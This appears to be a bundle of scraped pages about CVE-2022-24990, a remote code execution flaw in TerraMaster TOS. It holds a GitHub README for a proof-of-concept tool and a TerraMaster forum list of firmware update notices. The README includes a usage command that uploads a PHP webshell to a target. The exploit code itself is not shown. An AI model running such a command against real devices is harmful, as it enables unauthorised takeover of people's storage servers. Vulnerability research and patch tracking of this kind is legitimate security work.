=== Content from packetstormsecurity.com_e6c587c6_20250108_133028.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_56f8e312_20250108_133030.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xf4n9x%2FCVE-2022-24990)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xf4n9x%2FCVE-2022-24990)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=0xf4n9x%2FCVE-2022-24990)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[0xf4n9x](/0xf4n9x)
/
**[CVE-2022-24990](/0xf4n9x/CVE-2022-24990)**
Public

* [Notifications](/login?return_to=%2F0xf4n9x%2FCVE-2022-24990) You must be signed in to change notification settings
* [Fork
  9](/login?return_to=%2F0xf4n9x%2FCVE-2022-24990)
* [Star
   15](/login?return_to=%2F0xf4n9x%2FCVE-2022-24990)

CVE-2022-24990 TerraMaster TOS unauthenticated RCE via PHP Object Instantiation

[15
stars](/0xf4n9x/CVE-2022-24990/stargazers) [9
forks](/0xf4n9x/CVE-2022-24990/forks) [Branches](/0xf4n9x/CVE-2022-24990/branches) [Tags](/0xf4n9x/CVE-2022-24990/tags) [Activity](/0xf4n9x/CVE-2022-24990/activity)
 [Star](/login?return_to=%2F0xf4n9x%2FCVE-2022-24990)

 [Notifications](/login?return_to=%2F0xf4n9x%2FCVE-2022-24990) You must be signed in to change notification settings

* [Code](/0xf4n9x/CVE-2022-24990)
* [Issues
  0](/0xf4n9x/CVE-2022-24990/issues)
* [Pull requests
  0](/0xf4n9x/CVE-2022-24990/pulls)
* [Actions](/0xf4n9x/CVE-2022-24990/actions)
* [Security](/0xf4n9x/CVE-2022-24990/security)
* [Insights](/0xf4n9x/CVE-2022-24990/pulse)

Additional navigation options

* [Code](/0xf4n9x/CVE-2022-24990)
* [Issues](/0xf4n9x/CVE-2022-24990/issues)
* [Pull requests](/0xf4n9x/CVE-2022-24990/pulls)
* [Actions](/0xf4n9x/CVE-2022-24990/actions)
* [Security](/0xf4n9x/CVE-2022-24990/security)
* [Insights](/0xf4n9x/CVE-2022-24990/pulse)

# 0xf4n9x/CVE-2022-24990

    main[Branches](/0xf4n9x/CVE-2022-24990/branches)[Tags](/0xf4n9x/CVE-2022-24990/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[5 Commits](/0xf4n9x/CVE-2022-24990/commits/main/) | | |
| [imgs](/0xf4n9x/CVE-2022-24990/tree/main/imgs "imgs") | | [imgs](/0xf4n9x/CVE-2022-24990/tree/main/imgs "imgs") |  |  |
| [.gitignore](/0xf4n9x/CVE-2022-24990/blob/main/.gitignore ".gitignore") | | [.gitignore](/0xf4n9x/CVE-2022-24990/blob/main/.gitignore ".gitignore") |  |  |
| [CVE-2022-24990.py](/0xf4n9x/CVE-2022-24990/blob/main/CVE-2022-24990.py "CVE-2022-24990.py") | | [CVE-2022-24990.py](/0xf4n9x/CVE-2022-24990/blob/main/CVE-2022-24990.py "CVE-2022-24990.py") |  |  |
| [README.md](/0xf4n9x/CVE-2022-24990/blob/main/README.md "README.md") | | [README.md](/0xf4n9x/CVE-2022-24990/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2022-24990

> CVE-2022-24990 TerraMaster TOS unauthenticated RCE via PHP Object Instantiation

## Usage

Vulnerability Detection.

```
python CVE-2022-24990.py -u http://127.0.0.1:8080
```

Upload a PHP webshell.

```
python CVE-2022-24990.py -a http://127.0.0.1:8080
```

[![use](/0xf4n9x/CVE-2022-24990/raw/main/imgs/use.jpg)](/0xf4n9x/CVE-2022-24990/blob/main/imgs/use.jpg)

## Reference

* <https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/>
* <http://wiki.peiqi.tech/wiki/webapp/TerraMaster/TerraMaster%20TOS%20createRaid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-24990.html>

## About

CVE-2022-24990 TerraMaster TOS unauthenticated RCE via PHP Object Instantiation

### Resources

[Readme](#readme-ov-file)

[Activity](/0xf4n9x/CVE-2022-24990/activity)
### Stars

[**15**
stars](/0xf4n9x/CVE-2022-24990/stargazers)
### Watchers

[**3**
watching](/0xf4n9x/CVE-2022-24990/watchers)
### Forks

[**9**
forks](/0xf4n9x/CVE-2022-24990/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2F0xf4n9x%2FCVE-2022-24990&report=0xf4n9x+%28user%29)

## [Releases](/0xf4n9x/CVE-2022-24990/releases)

No releases published

## [Packages 0](/users/0xf4n9x/packages?repo_name=CVE-2022-24990)

No packages published

## Languages

* [Python
  100.0%](/0xf4n9x/CVE-2022-24990/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from wiki.peiqi.tech_528b0e62_20250108_160251.html ===




=== Content from forum.terra-master.com_45b0e41e_20250108_133029.html ===


# TerraMaster Official Forum

Bug Reports, Operation Guides, and Experience Sharing

[Skip to content](#start_here)

Search

[Advanced search](./search.php?sid=85da3508c491a4101888188b2d7c6118 "Advanced search")

* Quick links

  + [Unanswered topics](./search.php?search_id=unanswered&sid=85da3508c491a4101888188b2d7c6118)
  + [Active topics](./search.php?search_id=active_topics&sid=85da3508c491a4101888188b2d7c6118)
  + [Search](./search.php?sid=85da3508c491a4101888188b2d7c6118)
* [FAQ](/en/app.php/help/faq?sid=85da3508c491a4101888188b2d7c6118 "Frequently Asked Questions")
* [Login](./ucp.php?mode=login&redirect=viewforum.php%3Ff%3D28&sid=85da3508c491a4101888188b2d7c6118 "Login")
* [Register](./ucp.php?mode=register&sid=85da3508c491a4101888188b2d7c6118)

* [Board index](./index.php?sid=85da3508c491a4101888188b2d7c6118)
  [TNAS (TerraMaster NAS)](./viewforum.php?f=3&sid=85da3508c491a4101888188b2d7c6118)
  [Update Notice](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118)
* [Search](./search.php?sid=85da3508c491a4101888188b2d7c6118 "View the advanced search options")

## [Update Notice](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118)

Official news about TOS, mobile app, PC app updates or beta releases

[New Topic](./posting.php?mode=post&f=28&sid=85da3508c491a4101888188b2d7c6118 "Post a new topic")

Search

[Advanced search](./search.php?fid%5B%5D=28&sid=85da3508c491a4101888188b2d7c6118 "Advanced search")

82 topics

* 1
* [2](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=25)
* [3](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=50)
* [4](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=75)
* [Next](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=25)

* Announcements
  Replies
  Views
  Last post

* [How to choose the appropriate one from various backup tools provided by TerraMaster?](./viewtopic.php?t=6093&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [Gremlin](./memberlist.php?mode=viewprofile&u=6052&sid=85da3508c491a4101888188b2d7c6118) ![Great Britain](./ext/rmcgirr83/nationalflags/flags/gb.png "Great Britain") « [26 Apr 2024, 18:47](./viewtopic.php?p=34945&sid=85da3508c491a4101888188b2d7c6118#p34945 "Go to last post")

  Posted in [Data Backup](./viewforum.php?f=31&sid=85da3508c491a4101888188b2d7c6118)
  Replies: **3**
  by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 26 Apr 2024, 15:06
  » in [Data Backup](./viewforum.php?f=31&sid=85da3508c491a4101888188b2d7c6118)

  3 Replies
  65629 Views
  Last post by [Gremlin](./memberlist.php?mode=viewprofile&u=6052&sid=85da3508c491a4101888188b2d7c6118) ![Great Britain](./ext/rmcgirr83/nationalflags/flags/gb.png "Great Britain")

  26 Apr 2024, 18:47
* [TerraMaster TRAID+: Elevating Disk Array Management](./viewtopic.php?t=5949&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [syuheimurata](./memberlist.php?mode=viewprofile&u=11084&sid=85da3508c491a4101888188b2d7c6118) ![Japan](./ext/rmcgirr83/nationalflags/flags/jp.png "Japan") « [07 Dec 2024, 10:08](./viewtopic.php?p=40962&sid=85da3508c491a4101888188b2d7c6118#p40962 "Go to last post")

  Posted in [Know More About TOS 6](./viewforum.php?f=97&sid=85da3508c491a4101888188b2d7c6118)
  Replies: **10**
  by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 19 Mar 2024, 15:41
  » in [Know More About TOS 6](./viewforum.php?f=97&sid=85da3508c491a4101888188b2d7c6118)
  + [1](./viewtopic.php?t=5949&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=5949&sid=85da3508c491a4101888188b2d7c6118&start=10)

  10 Replies
  70960 Views
  Last post by [syuheimurata](./memberlist.php?mode=viewprofile&u=11084&sid=85da3508c491a4101888188b2d7c6118) ![Japan](./ext/rmcgirr83/nationalflags/flags/jp.png "Japan")

  07 Dec 2024, 10:08

* Topics
  Replies
  Views
  Last post

* [TOS 6.0.577 (X86) is Released for Update](./viewtopic.php?t=7081&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") « [Yesterday, 00:14](./viewtopic.php?p=41939&sid=85da3508c491a4101888188b2d7c6118#p41939 "Go to last post")

  Replies: **40**
  by [TMbuddy](./memberlist.php?mode=viewprofile&u=11002&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 24 Dec 2024, 11:30

  + [1](./viewtopic.php?t=7081&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=7081&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=7081&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=7081&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=7081&sid=85da3508c491a4101888188b2d7c6118&start=40)

  40 Replies
  6413 Views
  Last post by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China")

  Yesterday, 00:14
* [Does not meet the conditions for updating the TOS 5.1?](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [Gremlin](./memberlist.php?mode=viewprofile&u=6052&sid=85da3508c491a4101888188b2d7c6118) ![Great Britain](./ext/rmcgirr83/nationalflags/flags/gb.png "Great Britain") « [07 Oct 2024, 22:58](./viewtopic.php?p=38744&sid=85da3508c491a4101888188b2d7c6118#p38744 "Go to last post")

  Replies: **111**
   by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 15 Jul 2023, 15:01

  + [1](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [8](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118&start=70)
  + [9](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118&start=80)
  + [10](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118&start=90)
  + [11](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118&start=100)
  + [12](./viewtopic.php?t=4912&sid=85da3508c491a4101888188b2d7c6118&start=110)

  111 Replies
  95644 Views
  Last post by [Gremlin](./memberlist.php?mode=viewprofile&u=6052&sid=85da3508c491a4101888188b2d7c6118) ![Great Britain](./ext/rmcgirr83/nationalflags/flags/gb.png "Great Britain")

  07 Oct 2024, 22:58
* [TOS 5.1.73 (ARM) is Released for Update](./viewtopic.php?t=5514&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [Gremlin](./memberlist.php?mode=viewprofile&u=6052&sid=85da3508c491a4101888188b2d7c6118) ![Great Britain](./ext/rmcgirr83/nationalflags/flags/gb.png "Great Britain") « [Today, 06:22](./viewtopic.php?p=42001&sid=85da3508c491a4101888188b2d7c6118#p42001 "Go to last post")

  Replies: **11**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 18 Dec 2023, 15:46

  + [1](./viewtopic.php?t=5514&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=5514&sid=85da3508c491a4101888188b2d7c6118&start=10)

  11 Replies
  5845 Views
  Last post by [Gremlin](./memberlist.php?mode=viewprofile&u=6052&sid=85da3508c491a4101888188b2d7c6118) ![Great Britain](./ext/rmcgirr83/nationalflags/flags/gb.png "Great Britain")

  Today, 06:22
* [The TerraSync is now released, with Windows and Mac clients!](./viewtopic.php?t=5457&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") « [05 Jan 2025, 15:21](./viewtopic.php?p=41856&sid=85da3508c491a4101888188b2d7c6118#p41856 "Go to last post")

  Replies: **36**
  by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118) » 07 Dec 2023, 11:04

  + [1](./viewtopic.php?t=5457&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=5457&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=5457&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=5457&sid=85da3508c491a4101888188b2d7c6118&start=30)

  36 Replies
  38427 Views
  Last post by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China")

  05 Jan 2025, 15:21
* [TOS 6.0.530 Official Version Released](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMwuu](./memberlist.php?mode=viewprofile&u=5190&sid=85da3508c491a4101888188b2d7c6118) « [04 Jan 2025, 15:40](./viewtopic.php?p=41799&sid=85da3508c491a4101888188b2d7c6118#p41799 "Go to last post")

  Replies: **154**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 04 Nov 2024, 17:37

  + [1](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [12](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118&start=110)
  + [13](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118&start=120)
  + [14](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118&start=130)
  + [15](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118&start=140)
  + [16](./viewtopic.php?t=6809&sid=85da3508c491a4101888188b2d7c6118&start=150)

  154 Replies
  31698 Views
  Last post by [TMwuu](./memberlist.php?mode=viewprofile&u=5190&sid=85da3508c491a4101888188b2d7c6118)

  04 Jan 2025, 15:40
* [TOS 6.0.555 (X86) is Released for Update](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") « [29 Dec 2024, 14:42](./viewtopic.php?p=41569&sid=85da3508c491a4101888188b2d7c6118#p41569 "Go to last post")

  Replies: **63**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 05 Dec 2024, 11:48

  + [1](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [3](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118&start=40)
  + [6](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118&start=50)
  + [7](./viewtopic.php?t=7011&sid=85da3508c491a4101888188b2d7c6118&start=60)

  63 Replies
  11330 Views
  Last post by [TMroy](./memberlist.php?mode=viewprofile&u=1656&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China")

  29 Dec 2024, 14:42
* [TOS 5.1.145 (X86) is Released for Update](./viewtopic.php?t=6355&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [Ottavio](./memberlist.php?mode=viewprofile&u=4638&sid=85da3508c491a4101888188b2d7c6118) ![Italy](./ext/rmcgirr83/nationalflags/flags/it.png "Italy") « [18 Dec 2024, 23:32](./viewtopic.php?p=41330&sid=85da3508c491a4101888188b2d7c6118#p41330 "Go to last post")

  Replies: **37**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 15 Jul 2024, 13:56

  + [1](./viewtopic.php?t=6355&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=6355&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=6355&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=6355&sid=85da3508c491a4101888188b2d7c6118&start=30)

  37 Replies
  17208 Views
  Last post by [Ottavio](./memberlist.php?mode=viewprofile&u=4638&sid=85da3508c491a4101888188b2d7c6118) ![Italy](./ext/rmcgirr83/nationalflags/flags/it.png "Italy")

  18 Dec 2024, 23:32
* [TOS 6.0.535 (X86) is Released for Update](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [jollino](./memberlist.php?mode=viewprofile&u=9922&sid=85da3508c491a4101888188b2d7c6118) ![Italy](./ext/rmcgirr83/nationalflags/flags/it.png "Italy") « [15 Dec 2024, 17:53](./viewtopic.php?p=41257&sid=85da3508c491a4101888188b2d7c6118#p41257 "Go to last post")

  Replies: **114**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 14 Nov 2024, 11:10

  + [1](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [8](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118&start=70)
  + [9](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118&start=80)
  + [10](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118&start=90)
  + [11](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118&start=100)
  + [12](./viewtopic.php?t=6869&sid=85da3508c491a4101888188b2d7c6118&start=110)

  114 Replies
  20642 Views
  Last post by [jollino](./memberlist.php?mode=viewprofile&u=9922&sid=85da3508c491a4101888188b2d7c6118) ![Italy](./ext/rmcgirr83/nationalflags/flags/it.png "Italy")

  15 Dec 2024, 17:53
* [TOS 5.1.131 (X86) is Released for Update](./viewtopic.php?t=6124&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMeric](./memberlist.php?mode=viewprofile&u=7405&sid=85da3508c491a4101888188b2d7c6118) « [03 Dec 2024, 21:47](./viewtopic.php?p=40688&sid=85da3508c491a4101888188b2d7c6118#p40688 "Go to last post")

  Replies: **29**
   by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 07 May 2024, 10:37

  + [1](./viewtopic.php?t=6124&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=6124&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=6124&sid=85da3508c491a4101888188b2d7c6118&start=20)

  29 Replies
  13714 Views
  Last post by [TMeric](./memberlist.php?mode=viewprofile&u=7405&sid=85da3508c491a4101888188b2d7c6118)

  03 Dec 2024, 21:47
* [TOS 6.0.500 Official Release](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [Francois](./memberlist.php?mode=viewprofile&u=10899&sid=85da3508c491a4101888188b2d7c6118) ![France](./ext/rmcgirr83/nationalflags/flags/fr.png "France") « [18 Nov 2024, 02:35](./viewtopic.php?p=40002&sid=85da3508c491a4101888188b2d7c6118#p40002 "Go to last post")

  Replies: **122**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 19 Sep 2024, 10:34

  + [1](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [9](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118&start=80)
  + [10](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118&start=90)
  + [11](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118&start=100)
  + [12](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118&start=110)
  + [13](./viewtopic.php?t=6562&sid=85da3508c491a4101888188b2d7c6118&start=120)

  122 Replies
  46676 Views
  Last post by [Francois](./memberlist.php?mode=viewprofile&u=10899&sid=85da3508c491a4101888188b2d7c6118) ![France](./ext/rmcgirr83/nationalflags/flags/fr.png "France")

  18 Nov 2024, 02:35
* [TOS 6.0.531 (X86) is Released for Update](./viewtopic.php?t=6816&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") « [13 Nov 2024, 00:55](./viewtopic.php?p=39819&sid=85da3508c491a4101888188b2d7c6118#p39819 "Go to last post")

  Replies: **24**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 05 Nov 2024, 12:06

  + [1](./viewtopic.php?t=6816&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=6816&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=6816&sid=85da3508c491a4101888188b2d7c6118&start=20)

  24 Replies
  6593 Views
  Last post by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China")

  13 Nov 2024, 00:55
* [TOS 6.0.420 Beta Is Available for Testing](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [josssiii](./memberlist.php?mode=viewprofile&u=10855&sid=85da3508c491a4101888188b2d7c6118) ![Pakistan](./ext/rmcgirr83/nationalflags/flags/pk.png "Pakistan") « [12 Nov 2024, 19:46](./viewtopic.php?p=39808&sid=85da3508c491a4101888188b2d7c6118#p39808 "Go to last post")

  Replies: **297**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 22 Jul 2024, 15:25

  + [1](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [26](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118&start=250)
  + [27](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118&start=260)
  + [28](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118&start=270)
  + [29](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118&start=280)
  + [30](./viewtopic.php?t=6378&sid=85da3508c491a4101888188b2d7c6118&start=290)

  297 Replies
  77661 Views
  Last post by [josssiii](./memberlist.php?mode=viewprofile&u=10855&sid=85da3508c491a4101888188b2d7c6118) ![Pakistan](./ext/rmcgirr83/nationalflags/flags/pk.png "Pakistan")

  12 Nov 2024, 19:46
* [TOS 6.0.519 (X86) is Released for Update](./viewtopic.php?t=6758&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118) « [10 Nov 2024, 18:48](./viewtopic.php?p=39728&sid=85da3508c491a4101888188b2d7c6118#p39728 "Go to last post")

  Replies: **44**
  by [TMLeeh](./memberlist.php?mode=viewprofile&u=7709&sid=85da3508c491a4101888188b2d7c6118) » 23 Oct 2024, 14:32

  + [1](./viewtopic.php?t=6758&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=6758&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=6758&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=6758&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=6758&sid=85da3508c491a4101888188b2d7c6118&start=40)

  44 Replies
  12495 Views
  Last post by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118)

  10 Nov 2024, 18:48
* [TOS 6.0.512 (X86) is Released for Update](./viewtopic.php?t=6689&sid=85da3508c491a4101888188b2d7c6118)

